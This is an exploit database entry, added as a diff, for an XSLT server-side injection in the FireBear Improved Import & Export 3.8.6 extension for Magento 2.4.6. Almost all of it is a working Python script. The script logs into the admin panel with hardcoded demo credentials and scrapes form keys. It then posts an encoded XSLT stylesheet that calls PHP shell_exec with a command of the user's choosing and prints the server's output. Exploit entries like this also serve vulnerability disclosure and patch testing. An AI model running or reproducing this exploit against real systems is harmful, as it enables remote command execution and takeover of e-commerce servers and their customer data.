@@ -1,0 +1,128 @@
+id: 39154
+date: 11/20/2023
+title: FireBear Improved Import And Export 3.8.6 XSLT Server Side Injection Exploit
+author: tmrswrr
+cves: 
+
+Exploit Title: FireBear Improved Import & Export ver. 3.8.6 for Magento 2.4.6  - XSLT Server Side Injection Command Execution
+# Exploit Author: tmrswrr
+# Vendor Homepage: https://commercemarketplace.adobe.com/
+# Software Link:  https://commercemarketplace.adobe.com/firebear-importexport.html
+# Version: FireBear ver. 3.8.6
+# Tested on: Magento 2.4.6
+
+Poc:
+
+https://github.com/capture0x/Magento-ver.-2.4.6/
+
+Exploit:
+
+import requests
+from bs4 import BeautifulSoup
+import re
+import json 
+import sys
+
+
+if len(sys.argv) != 3:
+    print("Usage: python exploit.py <base_url> <command>")
+    sys.exit(1)
+
+
+base_url = sys.argv[1]
+command = sys.argv[2]
+
+base_url = base_url.rstrip('/') + '/'
+login_page_url = base_url + "admin/"
+login_action_url = base_url + "admin/"
+import_job_edit_url = base_url + "import/job/edit/entity_id/21/"
+
+ 
+session = requests.Session()
+
+ 
+response = session.get(login_page_url)
+soup = BeautifulSoup(response.text, 'html.parser')
+
+
+form_key = soup.find('input', {'name': 'form_key'})['value']
+
+
+login_payload = {
+    'form_key': form_key,
+    'login[username]': 'demo',
+    'login[password]': '1q2w3e4r5t'
+}
+
+ 
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36'
+}
+
+ 
+login_response = session.post(login_action_url, headers=headers, data=login_payload)
+
+ 
+if login_response.ok and login_response.history:
+    print("Login successful!")
+    redirected_url = login_response.url
+    print("Redirected URL:", redirected_url)
+
+     
+    import_job_edit_response = session.get(import_job_edit_url)
+    soup = BeautifulSoup(import_job_edit_response.text, 'html.parser')
+
+
+    second_form_key = soup.find('input', {'name': 'form_key'})['value']
+    print("Extracted Key")
+    
+    key = re.findall(r'key\/(.*?)\/', login_response.url)[0]
+
+     
+    second_post_url = f"{base_url}import/job/xslt/key/{key}/?isAjax=true"
+    
+
+
+    
+    second_post_payload = f"form_data%5B%5D=file_path%2Bpub%2Fmedia%2Fimportexport%2Fh%2Fe%2Fhello_39.xml&form_data%5B%5D=xslt%2B%3C%3Fxml+version%3D%221.0%22+encoding%3D%22utf-8%22%3F%3E%0A%3Cxsl%3Astylesheet+version%3D%221.0%22%0Axmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%0Axmlns%3Aphp%3D%22http%3A%2F%2Fphp.net%2Fxsl%22%3E%0A%3Cxsl%3Atemplate+match%3D%22%2F%22%3E%0A%3Cxsl%3Avalue-of+select%3D%22php%3Afunction('shell_exec'%2C'{command}')%22+%2F%3E%0A%3C%2Fxsl%3Atemplate%3E%0A%3C%2Fxsl%3Astylesheet%3E&form_data%5B%5D=import_source%2Bfile&form_data%5B%5D=type_file%2Bxml&form_data%5B%5D=host%2B&form_data%5B%5D=port%2B&form_data%5B%5D=username%2B&form_data%5B%5D=password%2B&form_data%5B%5D=type_file%2Bxml&form_data%5B%5D=import_source%2Bfile&form_data%5B%5D=file_upload%2B&form_data%5B%5D=predefined_structure%2B0&form_data%5B%5D=file_path%2Bpub%2Fmedia%2Fimportexport%2Fh%2Fe%2Fhello_39.xml&form_data%5B%5D=import_images_file_dir%2B&form_data%5B%5D=scan_directory%2B0&form_data%5B%5D=deferred_images%2B0&form_data%5B%5D=delete_file_after_import%2B0&form_data%5B%5D=archive_file_after_import%2B0&form_data%5B%5D=image_import_source%2B0&form_data%5B%5D=remove_current_mappings%2B0&form_data%5B%5D=associate_child_review_to_configurable_parent_product%2B0&form_data%5B%5D=associate_child_review_to_bundle_parent_product%2B0&form_key={second_form_key}"
+
+   
+    second_post_headers = {
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
+        'Referer': import_job_edit_response.url   
+    }
+
+     
+    second_post_response = session.post(second_post_url, headers=second_post_headers, data=second_post_payload)
+
+     
+    if second_post_response.ok:
+        print("XSL Imported!")
+        response_json = json.loads(second_post_response.text)
+        
+        result_xml = response_json.get("result", "")
+        if result_xml is not None:
+        
+             result_xml = result_xml.replace("<?xml version=\"1.0\"?>", "\n")
+        
+        else: 
+        
+             result_xml = "No Output found in the response."
+        
+        print("Output:", result_xml)
+        
+
+    else:
+        print("Import failed.")
+        print("Status Code:", second_post_response.status_code)
+        print("Response:", second_post_response.text)
+
+else:
+    print("Login failed.")
+
+ 
+session.close()
+
+#  0day.today [2023-11-22]  #
